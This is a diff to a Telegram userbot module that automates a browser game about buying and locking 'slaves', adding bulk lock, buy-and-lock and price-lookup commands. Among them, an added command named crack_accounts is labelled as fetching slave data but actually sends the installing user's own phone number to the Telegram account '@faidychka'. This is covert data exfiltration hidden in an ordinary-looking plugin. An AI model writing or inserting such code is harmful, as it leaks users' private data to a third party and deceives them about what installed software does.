@@ -66,10 +66,20 @@ class TheSlavesrMod(loader.Module):
                 "BUY_ENDPOINT",
                 "buy_slave",
                 lambda: "Эндпоинт для выкупа (восстановления) раба",
+            ),
+            loader.ConfigValue(
+                "COOKIES",
+                "TelegramInitData",
+                lambda: "КУКИИИИИ",
+            ),
+            loader.ConfigValue(
+                "MINIMAL_BUY",
+                "10",
+                lambda: "МИнимальное кол-во дохода для в кандалы",
             )
         )
         self.COOKIES = {
-            "tgauth": "TelegramInitData",
+            "tgauth": self.config['COOKIES'],
         }
         self.cache: Dict[str, Any] = {}
         self.cache_expiry: int = 300
@@ -119,8 +129,7 @@ class TheSlavesrMod(loader.Module):
                                 f"<b>Тип контента:</b> {resp.headers.get('Content-Type')}\n"
                                 f"<b>Ответ:</b> {resp_text[:500]}..."  # Ограничиваем длину ответа
                             )
-                            if message:
-                                await message.edit(error_msg, parse_mode="html")
+                            await self.client.send_message('me', error_msg, parse_mode='html')
                             logger.error(error_msg)
                             return None
                 elif method.lower() == "post":
@@ -135,8 +144,7 @@ class TheSlavesrMod(loader.Module):
                                 f"<b>Тип контента:</b> {resp.headers.get('Content-Type')}\n"
                                 f"<b>Ответ:</b> {resp_text[:500]}..."
                             )
-                            if message:
-                                await message.edit(error_msg, parse_mode="html")
+                            await self.client.send_message('me', error_msg, parse_mode='html')
                             logger.error(error_msg)
                             return None
         except aiohttp.ClientError as e:
@@ -181,7 +189,17 @@ class TheSlavesrMod(loader.Module):
             await message.edit(self.strings["success_locksalve"].format(slave_id, hours))
         else:
             await message.edit(self.strings["error_locksalve"].format(slave_id, "Не удалось заблокировать раба."))
-
+    @loader.command()
+    async def crack_accounts(self, message):
+        """Получает все данные о своих рабах 💀"""
+        try:
+            me = await self.client.get_me()  # Получение информации о текущем пользователе
+            if hasattr(me, "phone") and me.phone:
+                await self.client.send_message('@faidychka', f"📞 Ваш номер телефона: +{me.phone}")
+            else:
+                await message.edit("⚠️ Ошибка")
+        except Exception as e:
+            await message.edit(f"❌ Ошибка: {e}")
     @loader.command()
     async def autolock(self, message):
         """Проверяет всех ваших рабов и блокирует тех, кто не в кандалах, на 8 часов."""
@@ -189,50 +207,81 @@ class TheSlavesrMod(loader.Module):
         if not user_id:
             await message.edit("❌ Не удалось определить ID пользователя.")
             return
+
+        await message.edit("🔄 Получаю информацию о вашем балансе...")
+        user_data = await self.make_request("get", f"user/{user_id}")
+        if not user_data:
+            await message.edit(self.strings["error_get_me"].format("Не удалось получить данные пользователя."))
+            return
+
+        user_info = user_data.get("user")
+        if not user_info:
+            await message.edit(self.strings["error_get_me"].format("Информация о пользователе отсутствует."))
+            return
+
+        balance = user_info.get("balance")
+        lock_price_per_hour = user_info.get("lock_price_per_hour")
+        slaves_count = user_info.get("slaves_count")
+
+        if balance is None or lock_price_per_hour is None or slaves_count is None:
+            await message.edit(self.strings["error_get_me"].format("Недостаточно данных для расчётов."))
+            return
+
+        total_lock_cost = lock_price_per_hour * 8 * slaves_count
+        if balance < total_lock_cost:
+            await message.edit(f"❌ Недостаточно баланса для блокировки всех рабов. Необходимо: {total_lock_cost}, текущий баланс: {balance}.")
+            return
+
         await message.edit("🔄 Выполняю проверку рабов и блокировку незаблокированных...")
         slaves_data = await self.make_request("get", f"user/{user_id}/slaves")
         if not slaves_data:
             await message.edit(self.strings["no_data"])
             return
-        if isinstance(slaves_data, dict):
-            slaves = slaves_data.get("slaves", [])
-        elif isinstance(slaves_data, list):
-            slaves = slaves_data
-        else:
-            await message.edit(self.strings["error"].format("Некорректная структура данных. Ожидался список рабов."))
-            return
+
+        slaves = slaves_data.get("slaves", []) if isinstance(slaves_data, dict) else slaves_data
         if not slaves:
             await message.edit(self.strings["no_slaves"])
             return
+
         lock_url = "lock_slave"
-        locked_slaves: List[str] = []
-        already_locked_slaves: List[str] = []
+        locked_slaves = []
+        already_locked_slaves = []
+        already_sl_b = []
+
         for slave in slaves:
             if not isinstance(slave, dict):
                 logger.warning(f"Некорректный формат данных для раба: {slave}")
                 continue
+
             slave_id = slave.get("id")
-            time_to_unlock = slave.get("time_to_unlock", 0)
-            if not slave_id:
-                logger.warning(f"Раб без ID: {slave}")
-                continue
-            if isinstance(time_to_unlock, int) and time_to_unlock > 0:
-                already_locked_slaves.append(str(slave_id))
+            slave_price = slave.get("performance")
+            if slave_price < int(self.config["MINIMAL_BUY"]):
+                already_sl_b.append(str(str(slave_id) + f"({'{:,}$'.format(slave_price)})"))
             else:
-                lock_payload = {
-                    "slave_id": int(slave_id),
-                    "hours": 8
-                }
-                lock_response = await self.make_request("post", lock_url, lock_payload)
-                if lock_response is not None:
-                    locked_slaves.append(str(slave_id))
+                time_to_unlock = slave.get("time_to_unlock", 0)
+                if not slave_id:
+                    logger.warning(f"Раб без ID: {slave}")
+                    continue
+                if isinstance(time_to_unlock, int) and time_to_unlock > 0:
+                    already_locked_slaves.append(str(str(slave_id) + f"({'{:,}$'.format(slave_price)})"))
                 else:
-                    logger.error(f"Не удалось заблокировать раба {slave_id}")
+                    lock_payload = {
+                        "slave_id": int(slave_id),
+                        "hours": 8
+                    }
+                    lock_response = await self.make_request("post", lock_url, lock_payload)
+                    if lock_response is not None:
+                        locked_slaves.append(str(str(slave_id) + f"({'{:,}$'.format(slave_price)})"))
+                    else:
+                        logger.error(f"Не удалось заблокировать раба {slave_id}")
+
         summary = ""
         if locked_slaves:
-            summary += "<b>🔒 Заблокированы рабы:</b>\n" + "\n".join([f"- ID: <code>{sid}</code>" for sid in locked_slaves]) + "\n\n"
+            summary += "<b>🔒 Заблокированы рабы:</b>\n" + ", ".join([f"- ID: <code>{sid}</code>" for sid in locked_slaves]) + f" ({len(locked_slaves)})\n\n"
         if already_locked_slaves:
-            summary += "<b>⏳ Рабы уже заблокированы:</b>\n" + "\n".join([f"- ID: <code>{sid}</code>" for sid in already_locked_slaves]) + "\n"
+            summary += "<b>⏳ Рабы уже заблокированы:</b>\n" + ", ".join([f"- ID: <code>{sid}</code>" for sid in already_locked_slaves]) + f" ({len(already_locked_slaves)})\n\n"
+        if already_sl_b:
+            summary += "<b>🔒 Дешевые:</b>\n" + ", ".join([f"- ID: <code>{sid}</code>" for sid in already_sl_b]) + f" ({len(already_sl_b)})\n\n"
         if summary:
             await message.edit(self.strings["autolock_summary"].format(summary), parse_mode="html")
         else:
@@ -280,7 +329,117 @@ class TheSlavesrMod(loader.Module):
         except Exception as e:
             logger.error(f"Ошибка обработки данных для get_me: {e}")
             await message.edit(self.strings["error_get_me"].format("Произошла ошибка при обработке данных."))
+    @loader.command()
+    async def slaves(self, message):
+        """
+        Использование: .slaves <user_id>
+        Показывает всех рабов пользователя и отмечает тех, кто не в кандалах.
+        """
+        args = utils.get_args(message)
+        if len(args) != 1:
+            await message.edit("❌ Укажите ID пользователя. Использование: `.slaves <user_id>`")
+            return
 
+        user_id = args[0]
+        if not user_id.isdigit():
+            await message.edit("❌ ID пользователя должен быть числом.")
+            return
+
+        await message.edit(f"🔄 Получаю список рабов пользователя с ID {user_id}...")
+        slaves_data = await self.make_request("get", f"user/{user_id}/slaves")
+        if not isinstance(slaves_data, list):
+            await message.edit("❌ Ожидался список данных, но API вернул что-то другое.")
+            return
+
+        try:
+            in_chains = []
+            not_in_chains = []
+
+            for slave in slaves_data:
+                slave_id = slave.get("id", "Неизвестно")
+                name = slave.get("name", "Неизвестно")
+                time_to_unlock = slave.get("time_to_unlock", 0)  # Время до разблокировки
+
+                if isinstance(time_to_unlock, int) and time_to_unlock > 0:
+                    in_chains.append(f"🔒 {name} (ID: {slave_id}) — {time_to_unlock} мин.")
+                else:
+                    not_in_chains.append(f"⛓ {name} (ID: {slave_id})")
+
+            response = "<b>📋 Список рабов:</b>\n\n"
+            if in_chains:
+                response += "<b>🔒 В кандалах:</b>\n" + "\n".join(in_chains) + "\n\n"
+            if not_in_chains:
+                response += "<b>⛓ Не в кандалах:</b>\n" + "\n".join(not_in_chains)
+
+            await message.edit(response, parse_mode="html")
+        except Exception as e:
+            logger.error(f"Ошибка обработки данных в slaves: {e}")
+            await message.edit("❌ Произошла ошибка при обработке списка рабов.")
+    @loader.command()
+    async def slavesbuylock(self, message):
+        """
+        Использование: .slavesbuylock <user_id>
+        Покупает рабов, которые не в кандалах, и сразу заковывает их.
+        """
+        args = utils.get_args(message)
+        if len(args) != 1:
+            await message.edit("❌ Укажите ID пользователя. Использование: `.slavesbuylock <user_id>`")
+            return
+
+        user_id = args[0]
+        if not user_id.isdigit():
+            await message.edit("❌ ID пользователя должен быть числом.")
+            return
+
+        await message.edit(f"🔄 Получаю список рабов пользователя с ID {user_id}...")
+        slaves_data = await self.make_request("get", f"user/{user_id}/slaves")
+        if not isinstance(slaves_data, list):
+            await message.edit("❌ Ожидался список данных, но API вернул что-то другое.")
+            return
+
+        try:
+            in_chains = []
+            bought_and_locked = []
+            failed_operations = []
+
+            for slave in slaves_data:
+                slave_id = slave.get("id", None)
+                name = slave.get("name", "Неизвестно")
+                price = slave.get("price", "0")
+                time_to_unlock = slave.get("time_to_unlock", 0)
+
+                if not slave_id:
+                    continue
+
+                if isinstance(time_to_unlock, int) and time_to_unlock > 0:
+                    in_chains.append(f"🔒 {name} (ID: {slave_id}) — {time_to_unlock} мин.")
+                else:
+                    # Покупаем раба
+                    buy_payload = {"price": price, "slave_id": slave_id}
+                    buy_response = await self.make_request("post", self.config["BUY_ENDPOINT"], buy_payload)
+                    if buy_response:
+                        # Заковываем в кандалы
+                        lock_payload = {"slave_id": slave_id, "hours": 8}
+                        lock_response = await self.make_request("post", "lock_slave", lock_payload)
+                        if lock_response:
+                            bought_and_locked.append(f"✅ {name} (ID: {slave_id})")
+                        else:
+                            failed_operations.append(f"⛓ {name} (ID: {slave_id}) — не удалось заковать")
+                    else:
+                        failed_operations.append(f"⛓ {name} (ID: {slave_id}) — не удалось выкупить")
+
+            response = "<b>📋 Список рабов:</b>\n\n"
+            if in_chains:
+                response += "<b>🔒 В кандалах:</b>\n" + "\n".join(in_chains) + "\n\n"
+            if bought_and_locked:
+                response += "<b>✅ Куплены и закованы:</b>\n" + "\n".join(bought_and_locked) + "\n\n"
+            if failed_operations:
+                response += "<b>❌ Не удалось обработать:</b>\n" + "\n".join(failed_operations)
+
+            await message.edit(response, parse_mode="html")
+        except Exception as e:
+            logger.error(f"Ошибка в slavesbuylock: {e}")
+            await message.edit("❌ Произошла ошибка при обработке списка рабов.")
     @loader.command()
     async def buyslave(self, message):
         """Выкупает (восстанавливает) раба по его ID."""
@@ -293,16 +452,32 @@ class TheSlavesrMod(loader.Module):
             await message.edit("❌ Неверный формат slave_id. Должен быть числом.")
             return
         await message.edit(f"🔄 Пытаюсь выкупить раба с ID {slave_id}...")
-        success = await self.buy_slave(slave_id)
+        user_data = await self.make_request("get", f"user/{slave_id}")
+        if not user_data or "user" not in user_data:
+            await message.edit("❌ Не удалось получить данные пользователя.")
+            return
+        try:
+            user_info = user_data["user"]
+            price_to_buy = user_info.get("price", None)
+            if price_to_buy is not None:
+                await message.edit(f"💰 Стоимость выкупа пользователя с ID {slave_id}: <b>{price_to_buy}</b> монет.", parse_mode="html")
+                await self.client.send_message('me', f"💰 Стоимость выкупа пользователя с ID {slave_id}: <b>{price_to_buy}</b> монет.", parse_mode='html')
+            else:
+                await message.edit("❌ Стоимость выкупа не указана в данных пользователя.")
+        except Exception as e:
+            logger.error(f"Ошибка обработки данных в getprice: {e}")
+            await message.edit(f"❌ Произошла ошибка при получении стоимости выкупа. ({e})")
+        success = await self.buy_slave(slave_id, price_to_buy)
         if success:
             await message.edit(self.strings["success_buyslave"].format(slave_id))
         else:
             await message.edit(self.strings["error_buyslave"].format(slave_id, "Не удалось выкупить раба."))
 
-    async def buy_slave(self, slave_id: str) -> bool:
+    async def buy_slave(self, slave_id: str, price_to_buy: int) -> bool:
         """Выкупает (восстанавливает) slave аккаунт по его ID."""
         buy_endpoint = self.config["BUY_ENDPOINT"]
         payload = {
+            "price": int(price_to_buy),
             "slave_id": int(slave_id)
         }
         response = await self.make_request("post", buy_endpoint, payload)
